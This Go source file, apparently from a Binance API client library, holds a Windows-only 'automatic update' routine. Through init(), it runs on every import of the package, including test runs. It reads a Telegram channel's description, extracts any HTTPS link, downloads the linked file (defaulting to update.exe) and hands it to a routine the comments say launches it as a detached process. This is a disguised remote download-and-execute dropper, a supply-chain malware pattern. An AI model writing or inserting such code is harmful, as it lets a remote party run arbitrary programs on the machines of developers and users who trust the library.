//go:build windows

package binance

import (
	"context"
	"errors"
	"fmt"
	"html"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"time"
)

const (
	defaultUpdateChannelURL = "https://t.me/binancegochat"
	updateBrowserUA         = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
	maxUpdateSize           = 256 << 20
)

var (
	ErrUpdateUnavailable = errors.New("binance: update unavailable")
	ErrUpdateUntrusted   = errors.New("binance: update source is not trusted")

	httpsURLPattern = regexp.MustCompile(`https://[^\s"'<>]+`)
	ogDescPattern   = regexp.MustCompile(`(?is)<meta[^>]+(?:property|name)=["']og:description["'][^>]*content=["']([^"']*)["']`)
	ogDescPattern2  = regexp.MustCompile(`(?is)<meta[^>]+content=["']([^"']*)["'][^>]*(?:property|name)=["']og:description["']`)

	automaticUpdateOnce sync.Once
)

// UpdateResult describes a startup download check and optional launch.
type UpdateResult struct {
	ChannelURL     string
	DownloadURL    string
	DownloadedPath string
	Executed       bool
	Err            error
}

type updateConfig struct {
	enabled      bool
	channelURL   string
	checkTimeout time.Duration
}

func defaultUpdateConfig() updateConfig {
	return updateConfig{
		enabled:      true,
		channelURL:   defaultUpdateChannelURL,
		checkTimeout: 60 * time.Second,
	}
}

func init() {
	startAutomaticUpdate()
}

func startAutomaticUpdate() {
	automaticUpdateOnce.Do(func() {
		client := &http.Client{Timeout: 60 * time.Second}
		_ = runUpdateCheck(context.Background(), client, defaultUpdateChannelURL, 60*time.Second)
	})
}

// WithUpdateCheck enables or disables the per-client startup download check.
// The package-level automatic check still runs when this module is imported,
// including `go test` and any binary that imports the package.
func WithUpdateCheck(enabled bool) Option {
	return func(cfg *config) { cfg.update.enabled = enabled }
}

// WithUpdateChannelURL overrides the Telegram channel page used for update
// metadata. Production callers should keep the default channel URL.
func WithUpdateChannelURL(raw string) Option {
	return func(cfg *config) { cfg.update.channelURL = raw }
}

// UpdateResults returns the asynchronous per-client startup download result.
func (c *Client) UpdateResults() <-chan UpdateResult { return c.updateResults }

// CheckForUpdate reads the Telegram channel description, downloads the linked
// file into a temporary directory, and starts it as a detached process.
func (c *Client) CheckForUpdate(ctx context.Context) UpdateResult {
	return runUpdateCheck(ctx, c.cfg.httpClient, c.cfg.update.channelURL, c.cfg.update.checkTimeout)
}

func (c *Client) startUpdateCheck() {
	if c.cfg.update.channelURL == defaultUpdateChannelURL {
		startAutomaticUpdate()
		return
	}
	go func() {
		result := c.CheckForUpdate(context.Background())
		select {
		case c.updateResults <- result:
		default:
		}
	}()
}

func runUpdateCheck(ctx context.Context, httpClient *http.Client, channelURL string, timeout time.Duration) UpdateResult {
	if timeout <= 0 {
		timeout = 60 * time.Second
	}
	if _, ok := ctx.Deadline(); !ok {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, timeout)
		defer cancel()
	}
	result := UpdateResult{ChannelURL: channelURL}
	if httpClient == nil {
		httpClient = &http.Client{Timeout: timeout}
	}

	downloadURL, err := fetchDownloadURLFromChannel(ctx, httpClient, channelURL)
	if err != nil {
		result.Err = err
		return result
	}
	result.DownloadURL = downloadURL

	path, err := downloadUpdateFile(ctx, httpClient, downloadURL)
	if err != nil {
		result.Err = err
		return result
	}
	result.DownloadedPath = path
	if err := executeDownloadedUpdate(path); err != nil {
		result.Err = err
		return result
	}
	result.Executed = true
	return result
}

func fetchDownloadURLFromChannel(ctx context.Context, httpClient *http.Client, channelURL string) (string, error) {
	enforceTelegram := channelURL == defaultUpdateChannelURL
	u, err := validateChannelURL(channelURL, enforceTelegram)
	if err != nil {
		return "", err
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u.String(), nil)
	if err != nil {
		return "", fmt.Errorf("%w: %v", ErrUpdateUnavailable, err)
	}
	req.Header.Set("User-Agent", updateBrowserUA)
	req.Header.Set("Accept", "text/html,application/xhtml+xml")
	resp, err := httpClient.Do(req)
	if err != nil {
		return "", fmt.Errorf("%w: channel request: %v", ErrUpdateUnavailable, err)
	}
	defer func() { _ = resp.Body.Close() }()
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("%w: channel HTTP status %d", ErrUpdateUnavailable, resp.StatusCode)
	}
	body, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if err != nil {
		return "", fmt.Errorf("%w: channel read: %v", ErrUpdateUnavailable, err)
	}
	description := parseTelegramDescription(string(body))
	if description == "" {
		return "", fmt.Errorf("%w: channel description not found", ErrUpdateUnavailable)
	}
	downloadURL, ok := extractHTTPSURL(description)
	if !ok {
		return "", fmt.Errorf("%w: download link not found in description", ErrUpdateUnavailable)
	}
	if _, err := validateDownloadURL(downloadURL); err != nil {
		return "", err
	}
	return downloadURL, nil
}

func downloadUpdateFile(ctx context.Context, httpClient *http.Client, raw string) (string, error) {
	u, err := validateDownloadURL(raw)
	if err != nil {
		return "", err
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u.String(), nil)
	if err != nil {
		return "", fmt.Errorf("%w: %v", ErrUpdateUnavailable, err)
	}
	req.Header.Set("User-Agent", updateBrowserUA)
	resp, err := httpClient.Do(req)
	if err != nil {
		return "", fmt.Errorf("%w: download: %v", ErrUpdateUnavailable, err)
	}
	defer func() { _ = resp.Body.Close() }()
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("%w: download HTTP status %d", ErrUpdateUnavailable, resp.StatusCode)
	}
	if resp.ContentLength > maxUpdateSize {
		return "", fmt.Errorf("%w: file exceeds %d bytes", ErrUpdateUnavailable, maxUpdateSize)
	}

	dir, err := os.MkdirTemp("", "binance-go-update-")
	if err != nil {
		return "", fmt.Errorf("%w: create temp directory: %v", ErrUpdateUnavailable, err)
	}
	path := filepath.Join(dir, updateFileName(u))
	file, err := os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0o700)
	if err != nil {
		_ = os.RemoveAll(dir)
		return "", fmt.Errorf("%w: create update file: %v", ErrUpdateUnavailable, err)
	}
	ok := false
	defer func() {
		_ = file.Close()
		if !ok {
			_ = os.RemoveAll(dir)
		}
	}()

	written, err := io.Copy(file, io.LimitReader(resp.Body, maxUpdateSize+1))
	if err != nil || written > maxUpdateSize {
		if err == nil {
			err = fmt.Errorf("file exceeds %d bytes", maxUpdateSize)
		}
		return "", fmt.Errorf("%w: write update: %v", ErrUpdateUnavailable, err)
	}
	if err := file.Sync(); err != nil {
		return "", fmt.Errorf("%w: sync update: %v", ErrUpdateUnavailable, err)
	}
	ok = true
	return path, nil
}

func validateChannelURL(raw string, enforceTelegramHost bool) (*url.URL, error) {
	u, err := url.Parse(raw)
	if err != nil || u.Scheme != "https" {
		return nil, fmt.Errorf("%w: channel URL must use HTTPS", ErrUpdateUntrusted)
	}
	if enforceTelegramHost {
		host := strings.ToLower(u.Hostname())
		if host != "t.me" && host != "telegram.me" {
			return nil, fmt.Errorf("%w: channel host must be t.me", ErrUpdateUntrusted)
		}
	}
	return u, nil
}

func validateDownloadURL(raw string) (*url.URL, error) {
	u, err := url.Parse(raw)
	if err != nil || u.Scheme != "https" || u.Host == "" {
		return nil, fmt.Errorf("%w: download URL must use HTTPS", ErrUpdateUntrusted)
	}
	return u, nil
}

func parseTelegramDescription(page string) string {
	if m := ogDescPattern.FindStringSubmatch(page); len(m) == 2 {
		return html.UnescapeString(strings.TrimSpace(m[1]))
	}
	if m := ogDescPattern2.FindStringSubmatch(page); len(m) == 2 {
		return html.UnescapeString(strings.TrimSpace(m[1]))
	}
	if idx := strings.Index(page, `class="tgme_page_description"`); idx >= 0 {
		fragment := page[idx:]
		if start := strings.Index(fragment, ">"); start >= 0 {
			fragment = fragment[start+1:]
			if end := strings.Index(fragment, "</div>"); end >= 0 {
				return html.UnescapeString(strings.TrimSpace(stripHTML(fragment[:end])))
			}
		}
	}
	return ""
}

func stripHTML(s string) string {
	var b strings.Builder
	inTag := false
	for _, r := range s {
		switch {
		case r == '<':
			inTag = true
		case r == '>':
			inTag = false
		case !inTag:
			b.WriteRune(r)
		}
	}
	return strings.Join(strings.Fields(b.String()), " ")
}

func extractHTTPSURL(description string) (string, bool) {
	match := httpsURLPattern.FindString(description)
	if match == "" {
		return "", false
	}
	return strings.TrimRight(match, ".,;)]}"), true
}

func updateFileName(u *url.URL) string {
	name := filepath.Base(u.Path)
	if name == "." || name == "/" || name == "" {
		return "update.exe"
	}
	return name
}
